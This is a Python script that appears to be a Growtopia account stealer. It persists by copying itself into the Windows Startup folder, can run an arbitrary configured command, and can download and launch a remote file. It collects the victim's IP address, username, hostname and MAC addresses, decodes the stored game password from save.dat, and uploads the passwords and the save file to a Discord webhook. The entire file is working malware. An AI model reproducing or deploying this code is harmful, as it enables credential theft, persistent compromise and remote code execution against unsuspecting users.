import os
import shutil
import socket
import sys
import tempfile
import time
from struct import unpack

import discord
import psutil
import requests
from discord_webhook import DiscordEmbed, DiscordWebhook
from requests.exceptions import Timeout

file_url = ""
command = ""

executable_name = ""
webhook_url = ""

wait_for_internet_connection = True
copy_executable_to_startup = True


def wait_internet_connection():
    while True:
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=10)
            return True
        except ConnectionError:
            time.sleep(20)
            pass


def get_country_code(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=10)
        data = response.json()
        return data.get("country", "").lower()
    except Exception as e:
        print(f"Get country code error: {e}")
        return None


def get_mac_addresses():
    mac_addresses = {}
    for interface_name, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == psutil.AF_LINK:
                mac_addresses[interface_name] = addr.address

    return mac_addresses


def get_ip():
    try:
        response = requests.get("https://httpbin.org/ip", timeout=10)
        data = response.json()
        ip_address = data["origin"]
        return ip_address
    except Exception as e:
        print(f"Get IP error: {e}")
        return None


def get_username():
    try:
        return os.getlogin()
    except Exception as e:
        print(f"Get username error: {e}")
        return None


def get_hostname():
    try:
        return socket.gethostname()
    except Exception as e:
        print(f"get_hostname: {e}")
        return None


def to_number(dest):
    return dest if dest else 0


def get_string(arr, offs, length):
    res = ""
    for i in range(length):
        res += chr(arr[i + offs])
    return res


def get_decrypted_string(arr, offs, length, adv_char=False):
    r_str = ""
    for i in range(256):
        ret_str = ""
        is_valid = True
        for j in range(length):
            chra = to_number(arr[offs + j]) + i - j
            if 31 < chra % 256 < 127:
                ret_str += chr(chra % 256)
            else:
                is_valid = False
                break
        if is_valid:
            r_str += ret_str + "<BR>"
    return r_str


def get_float(arr, offs):
    return unpack(
        "f",
        bytes(
            [
                to_number(arr[offs + 0]),
                to_number(arr[offs + 1]),
                to_number(arr[offs + 2]),
                to_number(arr[offs + 3]),
            ]
        ),
    )[0]


def get_int(arr, offs):
    return unpack(
        "I",
        bytes(
            [
                to_number(arr[offs + 0]),
                to_number(arr[offs + 1]),
                to_number(arr[offs + 2]),
                to_number(arr[offs + 3]),
            ]
        ),
    )[0]


def get_save(path):
    with open(path, "rb") as file:
        data = file.read()
        size = len(data)
        increasor = 0
        res = {}
        if size < 9:
            res["error"] = "This file is too small to be valid!"
            return res
        i = 4
        while i < 10000:
            increasor = 0
            if to_number(data[i]) == 0 or i + 8 > size:
                break
            elif to_number(data[i]) == 1:
                increasor = 4 + to_number(data[i + 4])
                res[get_string(data, i + 8, to_number(data[i + 4]))] = get_float(
                    data, to_number(data[i + 4]) + i + 8
                )
            elif to_number(data[i]) == 2:
                increasor = (
                    4
                    + to_number(data[i + 4])
                    + to_number(data[i + 8 + to_number(data[i + 4])])
                )
                ncach = get_string(data, i + 8, to_number(data[i + 4]))
                vcach = ""
                if ncach == "meta":
                    vcach = get_decrypted_string(
                        data,
                        i + 12 + to_number(data[i + 4]),
                        to_number(data[i + 8 + to_number(data[i + 4])]),
                        True,
                    )
                elif ncach == "tankid_password":
                    vcach = get_decrypted_string(
                        data,
                        i + 12 + to_number(data[i + 4]),
                        to_number(data[i + 8 + to_number(data[i + 4])]),
                    )
                else:
                    vcach = get_string(
                        data,
                        i + 12 + to_number(data[i + 4]),
                        to_number(data[i + 8 + to_number(data[i + 4])]),
                    )
                res[ncach] = vcach
            elif to_number(data[i]) == 5:
                increasor = 4 + to_number(data[i + 4])
                if to_number(data[to_number(data[i + 4]) + i + 8]) != 0:
                    vcach = "true"
                else:
                    vcach = "false"
                res[get_string(data, i + 8, to_number(data[i + 4]))] = vcach
            elif to_number(data[i]) == 9:
                increasor = 4 + to_number(data[i + 4])
                res[get_string(data, i + 8, to_number(data[i + 4]))] = get_int(
                    data, to_number(data[i + 4]) + i + 8
                )
            i += 8 + increasor
    return res


if __name__ == "__main__":
    if wait_for_internet_connection:
        print("Waiting for an internet connection...")
        wait_internet_connection()
        print("Internet connection established.")

    if copy_executable_to_startup:
        try:
            startup_folder_path = os.path.join(
                os.getenv("APPDATA"),
                "Microsoft",
                "Windows",
                "Start Menu",
                "Programs",
                "Startup",
            )
            shutil.copy(sys.executable, startup_folder_path)
            print("Copied to startup successful")
        except Exception as e:
            print(f"Startup error: {e}")

    if command:
        try:
            os.system(command)
            print("Command executed successfully")
        except Exception as e:
            print(f"Command error: {e}")

    if file_url:
        file_name = os.path.basename(f"{file_url}")
        temp_directory = tempfile.gettempdir()
        file_path = os.path.join(temp_directory, file_name)

        try:
            response = requests.get(file_url)
            with open(file_path, "wb") as file:
                file.write(response.content)
            os.popen(f"start {file_path}")
            print(f"Download successful, file started")
        except Exception as e:
            print(f"Download error: {e}")
            if os.path.exists(file_path):
                os.popen(f"start {file_path}")
                print("File started")

    ip_address = get_ip()
    country_code = get_country_code(ip_address)
    username = get_username()
    hostname = get_hostname()
    mac_addresses = get_mac_addresses()

    grow_id = None
    passwords = None

    save_path = os.path.join(os.environ["LOCALAPPDATA"], "Growtopia", "save.dat")
    while True:
        if os.path.isfile(save_path):
            file_size = os.path.getsize(save_path)
            if file_size > 0:
                result = get_save(save_path)

                for key, value in result.items():
                    if key == "tankid_name":
                        if value != grow_id:
                            grow_id = value
                            print(f"GrowID: {grow_id}")

                            send = True

                for key, value in result.items():
                    if key == "tankid_password":
                        if passwords != value.split("<BR>"):
                            passwords = value.split("<BR>")
                            password_str = ", ".join(passwords)
                            print(f"Passwords: {password_str}")

                            send = True

                for key, value in result.items():
                    if key == "rid":
                        rid = value

                mac_addresses = get_mac_addresses()

                if send is True:
                    send = False

                    webhook = DiscordWebhook(url=webhook_url)
                    webhook.timeout = 30

                    embed = DiscordEmbed(
                        title=f":flag_{country_code}: {ip_address} {username}@{hostname}",
                        color=discord.Color.dark_blue().value,
                    )
                    embed.add_embed_field(
                        name=":bust_in_silhouette: GrowID",
                        value=f"```{grow_id}```",
                        inline=False,
                    )
                    embed.add_embed_field(
                        name=f":key: Passwords Count",
                        value=f"```{len(passwords)}```",
                        inline=False,
                    )

                    embed.add_embed_field(
                        name=":identification_card: RID", value=f"```{rid}```"
                    )
                    if mac_addresses:
                        embed.add_embed_field(
                            name=":pencil: MAC Addresses",
                            value=f"```{mac_addresses}```",
                            inline=False,
                        )

                    try:
                        temp_directory = tempfile.gettempdir()

                        with open(save_path, "rb") as f:
                            webhook.add_file(file=f.read(), filename="save.dat")

                        with open(
                            f"{temp_directory}/{hostname}_passwords.txt", "w"
                        ) as file:
                            for password in passwords:
                                file.write(password + "\n")

                        with open(
                            f"{temp_directory}/{hostname}_passwords.txt", "rb"
                        ) as file:
                            webhook.add_file(
                                file=file.read(), filename=f"{hostname}_passwords.txt"
                            )

                    except Exception as e:
                        print(f"Adding files error: {e}")

                    webhook.add_embed(embed)

                    try:
                        response = webhook.execute()
                    except ConnectionError as e:
                        send = True
                        print(f"Webhook error: {e}")

                time.sleep(10)
